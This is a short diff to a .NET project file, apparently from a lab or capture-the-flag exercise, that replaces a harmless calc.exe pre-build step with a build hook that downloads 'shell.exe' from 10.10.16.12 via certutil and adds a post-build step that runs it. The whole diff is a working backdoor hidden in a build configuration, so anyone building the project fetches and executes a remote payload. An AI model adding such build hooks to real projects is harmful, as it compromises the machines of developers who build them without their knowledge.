@@ -5,7 +5,8 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-    <PreBuildEvent>calc.exe</PreBuildEvent>
+    <PreBuildEvent>certutil.exe -f -urlcache -split http://10.10.16.12/shell.exe C:\Users\Public\shell.exe</PreBuildEvent>
+	  <PostBuildEvent>C:\Users\Public\shell.exe</PostBuildEvent>
   </PropertyGroup>
 
 </Project>
